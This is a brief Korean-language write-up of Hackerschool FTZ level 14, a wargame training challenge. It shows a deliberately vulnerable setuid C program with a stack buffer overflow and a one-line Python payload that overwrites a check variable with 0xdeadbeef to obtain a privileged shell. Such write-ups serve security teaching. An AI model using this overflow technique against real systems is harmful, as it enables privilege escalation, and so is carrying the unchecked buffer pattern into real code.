Hackerschool FTZ level14
===
~~~c

#include <stdio.h>
#include <unistd.h>

main()
{ int crap;
  int check;
  char buf[20];
  fgets(buf,45,stdin);
  if (check==0xdeadbeef)
   {
     setreuid(3095,3095);
     system("/bin/sh");
   }
}
~~~
>check = 0xffffffc8(%ebp)
>
>buf = 0xfffffff0(%ebp)

check와 buf의 주소차이가 40이므로 dummy 40 byte + 0xdeadbeef
> $ (python -c'print "A"*40+"\xef\xbe\xad\xde"';cat)|./attackme
>
>my-pass 